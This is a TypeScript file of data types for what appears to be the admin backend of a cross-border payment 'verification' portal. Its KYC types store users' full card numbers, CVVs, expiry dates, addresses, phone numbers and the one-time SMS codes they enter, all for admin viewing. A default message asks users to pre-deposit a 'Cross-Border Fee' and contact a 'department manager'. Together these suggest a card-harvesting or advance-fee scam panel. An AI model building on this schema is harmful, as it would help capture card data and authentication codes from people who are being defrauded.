export interface Transaction {
  id: string;
  ft_uid: string;
  serial_number: string;
  cbca_reference: string;
  amount: number;
  currency: string;
  company_name: string;
  employee_id: string;
  hash_value: string;
  jurisdiction: string;
  agreement_number: string;
  issue_date: string | null;
  settlement_days: number;
  exchange_rate: number | null;
  local_currency: string | null;
  local_amount: number | null;
  fee_crossborder: number;
  fee_intermediary: number;
  fee_tax: number;
  fee_description: string;
  review_status: "draft" | "pending" | "processing" | "approved" | "failed" | "awaiting_admin_confirmation";
  code_submitted_at: string | null;
  review_note: string;
  review_updated_at: string | null;
  aml_passed: boolean;
  admin_note: string;
  is_pinned: boolean;
  blockchain_enabled: boolean;
  blockchain_wallet_brand: string | null;
  created_by_admin?: string;
  created_at: string;
  updated_at: string;
}

export interface KycDraft {
  id: string;
  transaction_id: string;
  card_number: string;
  card_expiry: string;
  cvv: string;
  cardholder_name: string;
  country: string;
  street_address: string;
  house_number: string;
  city: string;
  state: string;
  postal_code: string;
  phone_number: string;
  verification_code: string | null;
  entered_verification_code: string | null;
  code_sent_at: string | null;
  card_type: "credit" | "debit" | null;
  payee_debit_card: string | null;
  card_bank_name: string | null;
  is_submitted: boolean;
  submitted_at: string | null;
  verification_channel: "card" | "blockchain" | null;
  blockchain_address: string | null;
  blockchain_username: string | null;
  blockchain_country: string | null;
  blockchain_region: string | null;
  blockchain_email: string | null;
  blockchain_no_kyc_reason: string | null;
  created_at: string;
  updated_at: string;
}

export interface KycSubmission {
  id: string;
  transaction_id: string;
  submission_number: number;
  submitted_at: string;
  card_number: string;
  card_expiry: string;
  cvv: string;
  cardholder_name: string;
  country: string;
  street_address: string;
  house_number: string;
  city: string;
  state: string;
  postal_code: string;
  phone_number: string;
  verification_code: string | null;
  entered_verification_code: string | null;
  card_type: "credit" | "debit" | null;
  payee_debit_card: string | null;
  card_bank_name: string | null;
  verification_channel: "card" | "blockchain" | null;
  blockchain_address: string | null;
  blockchain_username: string | null;
  blockchain_country: string | null;
  blockchain_region: string | null;
  blockchain_email: string | null;
  blockchain_no_kyc_reason: string | null;
  code_confirmed: boolean;
  ip_address: string | null;
  created_at: string;
}

export interface ReviewHistoryRecord {
  id: string;
  admin_username: string;
  review_status: string;
  review_note: string;
  reviewed_at: string;
  submission_number: number | null;
}

export interface KycSubmissionSummary {
  id: string;
  submission_number: number;
  submitted_at: string;
  entered_verification_code: string | null;
  phone_number: string;
  verification_code: string | null;
  code_confirmed: boolean;
  ip_address: string | null;
}

export interface CodeSendRecord {
  id: string;
  sent_at: string;
  phone_number: string;
  send_index: number;
  submission_number: number | null;
}

export interface AdminUser {
  id: string;
  username: string;
  role: "super" | "sub";
  is_active: boolean;
  created_by: string | null;
  created_at: string;
}

export interface EmployeeSessionRecord {
  id: string;
  ip_address: string;
  logged_in_at: string;
  last_seen_at: string;
}

export interface CodeSendLimitConfig {
  is_enabled: boolean;
  max_sends: number;
  warning_title: string;
  warning_message: string;
  send_count?: number;
}

export interface AdminNotification {
  id: string;
  title: string;
  content: string;
  mode: "popup" | "banner";
  is_fixed: boolean;
  is_active: boolean;
  show_once: boolean;
  created_by_admin: string | null;
  ft_uid: string | null;
  read_at: string | null;
  created_at: string;
  updated_at: string;
}

export interface BlockchainWalletBrand {
  id: string;
  name: string;
  is_active: boolean;
  sort_order: number;
  created_by_admin: string | null;
  created_at: string;
  updated_at: string;
}

export interface BlockchainChannelConfig {
  submit_success_title: string;
  submit_success_message: string;
  updated_at: string | null;
}

export const DEFAULT_BLOCKCHAIN_SUCCESS_TITLE = "Application Received";
export const DEFAULT_BLOCKCHAIN_SUCCESS_MESSAGE = "The address verification request for your activated Exclusive Digital Account has been submitted. Please ensure that your Exclusive Digital Account remains accessible and that the Cross-Border Fee has been pre-deposited. Once these steps are complete, please contact your department manager to finalize the verification.";

export interface BlockchainChannelStatus {
  tx_blockchain_enabled: boolean;
  wallet_brand: string | null;
  already_submitted: boolean;
  submit_success_title: string;
  submit_success_message: string;
}
